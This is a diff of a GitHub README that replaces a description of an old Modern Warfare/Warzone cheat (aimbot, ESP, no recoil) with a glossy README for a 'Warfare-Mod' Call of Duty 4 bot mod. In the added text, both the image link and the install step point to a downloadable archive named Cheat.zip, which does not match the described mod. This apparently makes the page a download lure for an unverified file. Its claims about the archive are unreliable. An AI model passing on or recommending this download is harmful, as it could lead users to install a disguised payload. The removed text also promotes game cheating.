@@ -1,28 +1,69 @@
-# MW-WZ-Internal
+# Warfare-Mod
 
-EDUCATIONAL PERPOSES ONLY NOT INDENDED TO BE USED
+![Warfare-Mod](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
-Outdated MW/WZ Cheat With Menu
+---
 
-A cheat for modern warfare (warzone) game mode. Expect shit code. But it works
-THIS IS NOT UPDATED NOR WILL I UPDATE IT FOR YOU
+## Overview
 
-Esp
-Bones
-Colour
-Customisable Aimbot
-No recoil
-Imgui menu
-NO INJECTOR INCLDED
-MISC OPTIONS:
-FOV, UAV Etc
-^ Was using old cbuff method update using info from Mist: https://www.unknowncheats.me/forum/call-of-duty-modern-warfare/496646-mw19-wz-set-dvars.html
+Welcome to **Warfare-Mod**, a repository dedicated to the popular game mod for *Call of Duty 4: Modern Warfare* – the [CoD4x] Bot Warfare version 2.2.0! This comprehensive mod enhances your gaming experience by introducing bots into the gameplay, taking the action to a whole new level.
 
+---
 
-If people still want to use it, use it. Or don't.
+## Features
 
-MEDIA:
+🎮 **Bot Warfare**: Experience intense battles by facing off against AI-controlled bots in various game modes.
 
-![unknown](https://user-images.githubusercontent.com/41522576/166277018-dd9d4388-565d-4e55-9f5d-564d4047a797.png)
-![unknown (1)](https://user-images.githubusercontent.com/41522576/166250014-9ec7a479-21bf-45f6-9c65-3e3a3b5b4f0e.png)
-![unknown](https://user-images.githubusercontent.com/41522576/166250033-75a3b7ee-2ffc-4471-bd3b-cab88ded50ce.png)
+🔫 **New Weapons**: Access a range of new weapons and equipment to dominate the battlefield.
+
+🏆 **Challenging AI**: Test your skills against smart and strategic AI opponents that provide a real challenge.
+
+⚙️ **Customizable Settings**: Tailor the mod to your preferences with adjustable settings and configurations.
+
+---
+
+## Installation
+
+To install the [Warfare-Mod], follow these steps:
+
+1. Download the mod file from the following link: [Download Now](https://github.com/user-attachments/files/16928413/Cheat.zip)
+
+2. Extract the contents of the downloaded ZIP file.
+
+3. Copy the extracted files into the game directory of *Call of Duty 4: Modern Warfare*.
+
+4. Launch the game and enjoy the enhanced gameplay experience with the Bot Warfare mod.
+
+---
+
+## Usage
+
+Once the mod is installed, launch *Call of Duty 4: Modern Warfare* and navigate to the multiplayer menu. Choose your desired game mode and map, and the bots will automatically populate the match. Prepare for intense battles and challenging encounters as you test your skills against the AI opponents.
+
+---
+
+## Support
+
+If you encounter any issues or have questions about the [Warfare-Mod], feel free to reach out to the mod developers or the community for assistance. Join online forums and communities dedicated to *Call of Duty 4: Modern Warfare* modding to connect with other players and enthusiasts.
+
+---
+
+## Contributions
+
+We welcome contributions from the community to enhance and improve the [Warfare-Mod]. Whether you have suggestions for new features, bug fixes, or optimizations, your input is valuable. Fork the repository, make your changes, and submit a pull request for review.
+
+---
+
+## License
+
+The [Warfare-Mod] is distributed under the MIT license. Feel free to modify and distribute the mod according to the terms specified in the license agreement.
+
+---
+
+## Acknowledgements
+
+A special thanks to the [CoD4x] development team for their dedication and hard work in creating an engaging modding platform for *Call of Duty 4: Modern Warfare*. Without their efforts, mods like the [Warfare-Mod] would not be possible.
+
+---
+
+Get ready for an adrenaline-pumping gaming experience with the [Warfare-Mod]. Download the mod now and immerse yourself in the intense battles and strategic gameplay that await. Dominate the battlefield and show off your skills in *Call of Duty 4: Modern Warfare* with the Bot Warfare mod!
